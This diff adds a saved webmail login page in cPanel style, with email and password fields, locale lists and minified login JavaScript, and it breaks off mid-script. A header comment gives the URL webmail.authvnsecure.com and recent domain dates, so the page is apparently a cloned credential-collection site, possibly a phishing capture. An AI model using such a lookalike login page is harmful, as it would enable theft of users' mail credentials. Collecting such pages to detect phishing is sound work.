@@ -1,0 +1,606 @@
+<!-- URL =http://webmail.authvnsecure.com/--><!-- w =('AUTHVNSECURE.COM', datetime.datetime(2020, 10, 19, 16, 56, 29), datetime.datetime(2021, 10, 19, 16, 56, 29))--><!DOCTYPE html>
+<html dir="ltr" lang="en">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="notranslate" name="google">
+   <meta content="app-id=1188352635" name="apple-itunes-app"/>
+   <title>
+    Webmail Login
+   </title>
+   <link href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" rel="shortcut icon" type="image/x-icon"/>
+   <!-- EXTERNAL CSS -->
+   <link href="/cPanel_magic_revision_1386192030/unprotected/nc-cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css"/>
+   <link href="/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/webmail_style_v2_optimized.css" rel="stylesheet" type="text/css"/>
+   <style type="text/css">
+    /*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  padding-top: 70px;
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll transparent;
+  background-size: 25px auto;
+  background-position: center 35px;
+}
+   </style>
+   <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1331649207/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]-->
+   <script>
+    window.DOM = { get: function(id) { return document.getElementById(id) } };
+   </script>
+  </meta>
+ </head>
+ <body class="wm">
+  <input id="goto_uri" type="hidden" value="/"/>
+  <input id="goto_app" type="hidden" value=""/>
+  <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
+  <div class="group has-pw-reset" id="login-wrapper">
+   <div class="wrapper">
+    <div id="notify">
+     <noscript>
+      <div class="error-notice">
+       <img align="left" alt="Error" src="/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/images/notice-error.png"/>
+       JavaScript is disabled in your browser.
+                    For Webmail to function properly, you must enable JavaScript.
+                    If you do not enable JavaScript, certain features in Webmail will not function correctly.
+      </div>
+     </noscript>
+    </div>
+    <div style="display:none">
+     <div id="locale-container" style="visibility:hidden">
+      <div id="locale-inner-container">
+       <div id="locale-header">
+        <div class="locale-head">
+         Please select a locale:
+        </div>
+        <div class="close">
+         <a href="javascript:void(0)" onclick="toggle_locales(false)">
+          X Close
+         </a>
+        </div>
+       </div>
+       <div id="locale-map">
+        <div class="scroller clear">
+         <div class="locale-cell">
+          <a href="?locale=ar">
+           العربية
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=bg">
+           български
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=cs">
+           čeština
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=da">
+           dansk
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=de">
+           Deutsch
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=el">
+           Ελληνικά
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=en">
+           English
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=es">
+           español
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=es_419">
+           español latinoamericano
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=es_es">
+           español de España
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=fi">
+           suomi
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=fil">
+           Filipino
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=fr">
+           français
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=he">
+           עברית
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=hu">
+           magyar
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=i_cpanel_snowmen">
+           ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=id">
+           Bahasa Indonesia
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=it">
+           italiano
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=ja">
+           日本語
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=ko">
+           한국어
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=ms">
+           Bahasa Melayu
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=nb">
+           norsk bokmål
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=nl">
+           Nederlands
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=no">
+           Norwegian
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=pl">
+           polski
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=pt">
+           português
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=pt_br">
+           português do Brasil
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=ro">
+           română
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=ru">
+           русский
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=sl">
+           slovenščina
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=sv">
+           svenska
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=th">
+           ไทย
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=tr">
+           Türkçe
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=uk">
+           українська
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=vi">
+           Tiếng Việt
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=zh">
+           中文
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=zh_cn">
+           中文（中国）
+          </a>
+         </div>
+         <div class="locale-cell">
+          <a href="?locale=zh_tw">
+           中文（台湾）
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div id="content-container">
+     <div class="login-container" id="login-container">
+      <div class="login-container__sub-container" id="login-sub-container">
+       <div class="login-container__header" id="login-sub-header">
+        <img alt="logo" class="main-logo" src="/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/images/webmail-logo.svg"/>
+       </div>
+       <div class="login-container__main" id="login-sub">
+        <div id="clickthrough_form" style="visibility:hidden">
+         <form action="javascript:void(0)">
+          <div class="notices">
+          </div>
+          <button class="clickthrough-cont-btn" type="submit">
+           Continue
+          </button>
+         </form>
+        </div>
+        <div class="login-container__login-form login-form" id="forms">
+         <form action="/login/" id="login_form" method="post" novalidate="" style="visibility:" target="_top">
+          <div class="input-req-login login-form__label">
+           <label for="user">
+            Email Address
+           </label>
+          </div>
+          <div class="input-field-login icon username-container login-form__input">
+           <input autocomplete="off" autofocus="autofocus" class="std_textbox form-control" id="user" name="user" placeholder="Enter your email address." required="" tabindex="1" type="text" value=""/>
+          </div>
+          <div class="input-req-login login-password-field-label login-form__label">
+           <label for="pass">
+            Password
+           </label>
+          </div>
+          <div class="input-field-login icon password-container login-form__input form-field form-field--with-action">
+           <input autocomplete="off" class="std_textbox form-control" id="pass" name="pass" placeholder="Enter your email password." required="" tabindex="2" type="password"/>
+          </div>
+          <div class="controls login-form__controls">
+           <div class="login-btn">
+            <button id="login_submit" name="login" tabindex="3" type="submit">
+             Log in
+            </button>
+           </div>
+           <div class="reset-pw">
+            <a href="/resetpass?start=1" id="reset_password">
+             Reset Password
+            </a>
+           </div>
+          </div>
+          <div class="clear" id="push">
+          </div>
+          <script>
+           window.onload = function() {
+                                        var inputs = [...document.querySelectorAll('.form-control')];
+                                        var submit = document.getElementById('login_submit');
+                                        var btnIsDisabled = true;
+
+                                        toggleBtnState();
+
+                                        inputs.forEach(function(input) {
+                                          input.addEventListener('input', checkInputsOnEmpty);
+                                        })
+
+                                        function checkInputsOnEmpty() {
+                                          if (this.value === '') {
+                                            this.classList.add('is-error');
+                                          } else {
+                                            this.classList.remove('is-error');
+                                          }
+
+                                          toggleBtnState();
+                                        };
+
+                                        function toggleBtnState() {
+                                          btnIsDisabled = inputs.some(function(input) {
+                                            return input.value === '';
+                                          })
+                                          btnIsDisabled ? submit.setAttribute('disabled', true) : submit.removeAttribute('disabled')
+                                        }
+
+                                          var pass = document.getElementById("pass");
+                                          document.getElementById("toggle_pass").addEventListener("click", function (event) {
+                                              event.preventDefault();
+                                              toggle_view(pass)
+                                          });
+
+                                          function toggle_view(element) {
+                                              if (element.type === "password") {
+                                                  element.type = "text";
+                                              } else {
+                                                  element.type = "password";
+                                              }
+                                              return false;
+                                          }
+
+                                      };
+          </script>
+         </form>
+         <!--CLOSE forms -->
+        </div>
+        <!--CLOSE login-sub -->
+       </div>
+       <!--CLOSE wrapper -->
+      </div>
+      <!--CLOSE login-sub-container -->
+     </div>
+     <!-- Promo Chat — Copy this HTML -->
+     <div class="promo-chat">
+      <div class="grid-col">
+       <p>
+        <em>
+         Need help?
+        </em>
+        We're always here for you.
+       </p>
+       <p>
+        <a class="btn green" href="/unprotected/nc-cpanel/nc-livechat/live-chat.php" target="_blank">
+         Chat with a Live Person
+        </a>
+       </p>
+      </div>
+     </div>
+     <!-- END of Promo Chat — End of Copy this HTML -->
+     <div id="locale-footer">
+      <div class="locale-container">
+       <noscript>
+        <form action="." method="get">
+         <select name="locale">
+          <option value="">
+           Change locale
+          </option>
+          <option value="ar">
+           العربية
+          </option>
+          <option value="bg">
+           български
+          </option>
+          <option value="cs">
+           čeština
+          </option>
+          <option value="da">
+           dansk
+          </option>
+          <option value="de">
+           Deutsch
+          </option>
+          <option value="el">
+           Ελληνικά
+          </option>
+          <option value="en">
+           English
+          </option>
+          <option value="es">
+           español
+          </option>
+          <option value="es_419">
+           español latinoamericano
+          </option>
+          <option value="es_es">
+           español de España
+          </option>
+          <option value="fi">
+           suomi
+          </option>
+          <option value="fil">
+           Filipino
+          </option>
+          <option value="fr">
+           français
+          </option>
+          <option value="he">
+           עברית
+          </option>
+          <option value="hu">
+           magyar
+          </option>
+          <option value="i_cpanel_snowmen">
+           ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
+          </option>
+          <option value="id">
+           Bahasa Indonesia
+          </option>
+          <option value="it">
+           italiano
+          </option>
+          <option value="ja">
+           日本語
+          </option>
+          <option value="ko">
+           한국어
+          </option>
+          <option value="ms">
+           Bahasa Melayu
+          </option>
+          <option value="nb">
+           norsk bokmål
+          </option>
+          <option value="nl">
+           Nederlands
+          </option>
+          <option value="no">
+           Norwegian
+          </option>
+          <option value="pl">
+           polski
+          </option>
+          <option value="pt">
+           português
+          </option>
+          <option value="pt_br">
+           português do Brasil
+          </option>
+          <option value="ro">
+           română
+          </option>
+          <option value="ru">
+           русский
+          </option>
+          <option value="sl">
+           slovenščina
+          </option>
+          <option value="sv">
+           svenska
+          </option>
+          <option value="th">
+           ไทย
+          </option>
+          <option value="tr">
+           Türkçe
+          </option>
+          <option value="uk">
+           українська
+          </option>
+          <option value="vi">
+           Tiếng Việt
+          </option>
+          <option value="zh">
+           中文
+          </option>
+          <option value="zh_cn">
+           中文（中国）
+          </option>
+          <option value="zh_tw">
+           中文（台湾）
+          </option>
+         </select>
+         <button style="margin-left: 10px" type="submit">
+          Change
+         </button>
+        </form>
+        <style type="text/css">
+         #mobilelocalemenu, #locales_list {display:none}
+        </style>
+       </noscript>
+       <ul class="locales_list" id="locales_list">
+        <li>
+         <a href="/?locale=ar">
+          العربية
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=bg">
+          български
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=cs">
+          čeština
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=da">
+          dansk
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=de">
+          Deutsch
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=el">
+          Ελληνικά
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=en">
+          English
+         </a>
+        </li>
+        <li>
+         <a href="/?locale=es">
+          español
+         </a>
+        </li>
+        <li>
+         <a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">
+          …
+         </a>
+        </li>
+       </ul>
+       <div id="mobilelocalemenu">
+        Select a locale:
+        <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">
+         English
+        </a>
+       </div>
+      </div>
+     </div>
+    </div>
+    <!--Close login-wrapper -->
+   </div>
+   <script>
+    var MESSAGES = {"internal_error":"An internal error occurred. If this condition persists, contact the system administrator.","read_below":"Read the important information below.","session_locale":"The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.","authenticating":"Authenticating …","no_username":"You must specify a username to log in.","network_error":"A network error occurred during your login request. Please try again. If this condition persists, contact your network service provider.","invalid_login":"The login is invalid.","success":"Login successful. Redirecting …","ajax_timeout":"The connection timed out. Please try again."};
+
+    window.IS_LOGOUT = false;
+
+
+//login.js
+"use strict";var FADE_DURATION=.45,FADE_DELAY=20,AJAX_TIMEOUT=3e4,LOCALE_FADES=[],HAS_CSS_OPACITY="opacity"in document.body.style,login_form=DOM.get("login_form"),login_username_el=DOM.get("user"),login_password_el=DOM.get("pass"),login_submit_el=DOM.get("login_submit"),goto_app=DOM.get("goto_app"),goto_uri=DOM.get("goto_uri");login_username_el.addEventListener("input",()=>{unlock_login(login_username_el,login_password_el)}),login_password_el.addEventListener("input",()=>{unlock_login(login_username_el,login_password_el)});var div_cache={"login-page":DOM.get("login-page")||!1,"locale-container":DOM.get("locale-container")||!1,"login-container":DOM.get("login-container")||!1,"locale-footer":DOM.get("locale-footer")||!1,"content-cell":DOM.get("content-container")||!1,invalid:DOM.get("invalid")||!1},content_cell=div_cache["content-cell"];div_cache["locale-footer"]&&(div_cache["locale-footer"].style.display="block");var reset_form=DOM.get("reset_form"),reset_username_el=DOM.get("reset_pass_username"),RESET_FADES=[],show_reset=function(){for(reset_username_el.value||(reset_username_el.value=login_username_el.value);RESET_FADES.length;)clearInterval(RESET_FADES.shift());RESET_FADES.push(fade_in(reset_form)),RESET_FADES.push(fade_out(login_form)),reset_username_el.focus()},hide_reset=function(){for(;RESET_FADES.length;)clearInterval(RESET_FADES.shift());RESET_FADES.push(fade_in(login_form)),RESET_FADES.push(fade_out(reset_form)),login_username_el.focus()};const ErrorClassNameForInput="is-error";var SUBMIT_LOCKED=!1,FAILED_LOGIN=void 0,FAILED_PASSWORD=void 0;function lock_login(e,t){e.classList.add(ErrorClassNameForInput),t.classList.add(ErrorClassNameForInput),SUBMIT_LOCKED=!0,login_submit_el.disabled=SUBMIT_LOCKED,FAILED_LOGIN=e.value,FAILED_PASSWORD=t.value}function unlock_login(e,t){SUBMIT_LOCKED&&(e.value===FAILED_LOGIN&&t.value===FAILED_PASSWORD||(e.classList.remove(ErrorClassNameForInput),t.classList.remove(ErrorClassNameForInput),SUBMIT_LOCKED=!1,login_submit_el.disabled=SUBMIT_LOCKED))}function toggle_locales(e){for(;LOCALE_FADES.length;)clearInterval(LOCALE_FADES.shift());var t=div_cache[e?"locale-container":"login-container"];if(set_opacity(t,0),HAS_CSS_OPACITY)content_cell.replaceChild(t,content_cell.children[0]);else{var o=content_cell.children[0];content_cell.insertBefore(t,o),t.style.display="",o.style.display="none"}LOCALE_FADES.push(fade_in(t)),LOCALE_FADES.push((e?fade_out:fade_in)("locale-footer"))}if(HAS_CSS_OPACITY)var set_opacity=function(e,t){e.style.opacity=t};else{var filter_regex=/(DXImageTransform\.Microsoft\.Alpha\()[^)]*\)/;set_opacity=function(e,t){var o=e.currentStyle.filter;if(o)if(filter_regex.test(o)){var n=o.replace(filter_regex,"$1enabled=true)");n!==o&&(e.style.filter=n)}else e.style.filter+=" progid:DXImageTransform.Microsoft.Alpha(enabled=true)";else e.style.filter="progid:DXImageTransform.Microsoft.Alpha(enabled=true)";try{e.filters.item("DXImageTransform.Microsoft.Alpha").opacity=100*t}catch(o){try{e.filters.item("alpha").opacity=100*t}catch(e){}}}}function fade_in(e,t,o){var n,s,i=(e=div_cache[e]||DOM.get(e)||e).style,l=window.getComputedStyle?getComputedStyle(e,null):e.currentStyle,a=l.visibility;if(e.offsetWidth&&"hidden"!==a){if(window.getComputedStyle)s=Number(l.opacity);else{try{s=e.filters.item("DXImageTransform.Microsoft.Alpha").opacity}catch(t){try{s=e.filters("alpha").opacity}catch(e){s=100}}s/=100}s||(s=0)}else s=0,set_opacity(e,0);if(!(o&&s<.01)){t||(t=FADE_DURATION);var r,_=1e3*t,c=new Date;o?r=_+c.getTime():i.visibility="visible";var u=function(){var t;o?(t=s*(r-new Date)/_)<=0&&(t=0,clearInterval(n),i.visibility="hidden"):(t=s+(1-s)*(new Date-c)/_)>=1&&(t=1,clearInterval(n)),set_opacity(e,t)};return u(),n=setInterval(u,FADE_DELAY)}s&&set_opacity(e,0)}function fade_out(e,t){return fade_in(e,t,!0)}function ajaxObject(e,t){this._url=e,this._callback=t||function(){}}ajaxObject.prototype.updating=!1,ajaxObject.prototype.abort=function(){this.updating&&(this.AJAX.abort(),delete this.AJAX)},ajaxObject.prototype.update=function(e,t){if(this.AJAX)return!1;var o,n=null;if(window.XMLHttpRequest)n=new XMLHttpRequest;else{if(!window.ActiveXObject)return!1;n=new ActiveXObject("Microsoft.XMLHTTP")}var s=this;n.onreadystatechange=function(){4==n.readyState&&(clearTimeout(o),s.updating=!1,s._callback(n),delete s.AJAX)};try{var i;o=setTimeout(function(){s.abort(),show_status(MESSAGES.ajax_timeout,"error")},AJAX_TIMEOUT),/post/i.test(t)?(i=this._url+"?login_only=1",n.open("POST",i,!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.send(e)):(i=this._url+"?"+e+"&timestamp="+(new Date).getTime(),n.open("GET",i,!0),n.send(null)),this.AJAX=n,this.updating=!0}catch(e){login_form.submit()}return!0};var _text_content="textContent"in document.body?"textContent":"innerText";function login_results(e){var t;try{t=JSON.parse(e&&e.responseText)}catch(e){t=null}var o=e.status;if(200!==o){if(4===parseInt(o/100,10)){var s=t&&t.message;show_status(MESSAGES[s||"invalid_login"]||MESSAGES.invalid_login,"error"),lock_login(login_username_el,login_password_el)}else show_status(MESSAGES.network_error,"error");return show_links(document.body),void(SUBMIT_LOCKED||login_button.release())}if(t){var i,l;if(t.redirect&&!/^\/(?:logout|login|openid_connect_callback)\/?/.test(t.redirect)&&(i=t.redirect),/^(?:\/cpsess[^\/]+)\/$/.test(i))l=top.location;else{if(t.security_token&&top!==window)for(var a=0;a<top.frames.length;a++)if(top.frames[a]!==window){var r=top.frames[a].location.href.replace(/\/cpsess[.\d]+/,t.security_token);top.frames[a].location.href=r}l=location}var _=function(){l.href=i+location.hash};if(t.notices&&t.notices.length){show_status(MESSAGES.read_below,"warn");var c=DOM.get("clickthrough_form"),u=c.querySelector(".notices");for(n=0;n<t.notices.length;n++){var d=document.createElement("p");d.textContent=t.notices[n].content,u.appendChild(d)}c.onsubmit=_,fade_out(login_form),fade_in(c)}else show_status(MESSAGES.success,"success"),fade_out("content-container",FADE_DURATION/2),_()}else login_form.submit()}var level_classes={info:"info-notice",error:"error-notice",success:"success-notice",warn:"warn-notice"},levels_regex="";for(var lv in level_classes)levels_regex+="|"+level_classes[lv];function show_status(e,t){DOM.get("login-status-message")[_text_content]=e;var o=DOM.get("login-status"),n=t&&level_classes[t]||level_classes.info,s=o.className.replace(levels_regex,n);o.className=s,fade_in(o),reset_status_timeout()}levels_regex=new RegExp("\\b(?:"+levels_regex.slice(1)+")\\b");var STATUS_TIMEOUT=null;function reset_status_timeout(){clearTimeout(STATUS_TIMEOUT),STATUS_TIMEOUT=null}function set_status_timeout(e){STATUS_TIMEOUT=setTimeout(function(){fade_out("login-status")},e||8e3)}var LOGIN_SUBMIT_OK=!0;function do_login(){if(LOGIN_SUBMIT_OK){if(LOGIN_SUBMIT_OK=!1,0===login_username_el.value.length)return show_status(MESSAGES.no_username,"error"),!1;hide_links(document.body),login_button.suppress(),show_status(MESSAGES.authenticating,"info");var e=goto_app&&goto_app.value?"&goto_app="+encodeURIComponent(goto_app.value):"",t=goto_uri&&goto_uri.value?"&goto_uri="+encodeURIComponent(goto_uri.value):"";new ajaxObject(login_form.action,login_results).update("user="+encodeURIComponent(login_username_el.value)+"&pass="+encodeURIComponent(login_password_el.value)+e+t,"POST")}return!1}function _set_links_style(e,t,o){for(var n=e.getElementsByTagName("a"),s=n.length-1;s>=0;s--)n[s].style[t]=o}function hide_links(e){_set_links_style(e,"visibility","hidden")}function show_links(e){_set_links_style(e,"visibility","")}document.body.onkeyup=function(){LOGIN_SUBMIT_OK=!0},document.body.onmousedown=function(){LOGIN_SUBMIT_OK=!0};var login_button={button:login_submit_el,_suppressed_disabled:null,suppress:function(){null===this._suppressed_disabled&&(this._suppressed_disabled=this.button.disabled,this.button.disabled=!0)},release:function(){null!==this._suppressed_disabled&&(this.button.disabled=this._suppressed_disabled,this._suppressed_disabled=null)},queue_disabled:function(e){null===this._suppressed_disabled?this.button.disabled=e:this._suppressed_disabled=e}};function show_login(){document.getElementById("select_user_form").style.display="none",document.getElementById("login_form").style.visibility="",document.getElementById("select_users_option_block").style.display="block",document.getElementById("login-sub").style.display="block"}function show_select_user(){document.getElementById("login_form").style.visibility="hidden",document.getElementById("select_users_option_block").style.display="none",document.getElementById("select_user_form").style.display="block",document.getElementById("login-sub").style.display="none"}if(!window.JSON){login_button.suppress();var new_script=document.createElement("script");new_script.onreadystatechange=function(){"loaded"!==this.readyState&&"complete"!==this.readyState||(this.onreadystatechange=null,window.JSON={parse:window.jsonParse},window.jsonParse=void 0,login_button.release())},new_script.src="/unprotected/json-minified.js",document.getElementsByTagName("head")[0].appendChild(new_script)}try{login_form.onsubmit=do_login,set_opacity(DOM.get("login-wrapper"),0),LOCALE_FADES.push(fade_in("login-wrapper"));var preload=document.createElement("div");preload.id="preload_images",document.body.insertBefore(preload,document.body.firstChild),window.IS_LOGOUT?set_status_timeout(1e4):/(?:\?|&)locale=[^&]/.test(location.search)&&show_status(MESSAGES.session_locale),setTimeout(function(){login_username_el.focus()},100)}catch(e){window.console&&console.warn(e)}
+//jstz.min.js
+/*! jstz - v1.0.4 - 2012-12-18 */
+(function(e){var t=function(){"use strict";var e="s",n=function(e){var t=-e.getTimezoneOffset();return t!==null?t:0},r=function(e,t,n){var r=new Date;return e!==undefined&&r.setFullYear(e),r.setDate(n),r.setMonth(t),r},i=function(e){return n(r(e,0,2))},s=function(e){return n(r(e,5,2))},o=function(e){var t=e.getMonth()>7?s(e.getFullYear()):i(e.getFullYear()),r=n(e);return t-r!==0},u=function(){var t=i(),n=s(),r=i()-s();return r<0?t+",1":r>0?n+",1,"+e:t+",0"},a=function(){var e=u();return new t.TimeZone(t.olson.timezones[e])},f=function(e){var t=new Date(2010,6,15,1,0,0,0),n={"America/Denver":new Date(2011,2,13,3,0,0,0),"America/Mazatlan":new Date(2011,3,3,3,0,0,0),"America/Chicago":new Date(2011,2,13,3,0,0,0),"America/Mexico_City":new Date(2011,3,3,3,0,0,0),"America/Asuncion":new Date(2012,9,7,3,0,0,0),"America/Santiago":new Date(2012,9,3,3,0,0,0),"America/Campo_Grande":new Date(2012,9,21,5,0,0,0),"America/Montevideo":new Date(2011,9,2,3,0,0,0),"America/Sao_Paulo":new Date(2011,9,16,5,0,0,0),"America/Los_Angeles":new Date(2011,2,13,8,0,0,0),"America/Santa_Isabel":new 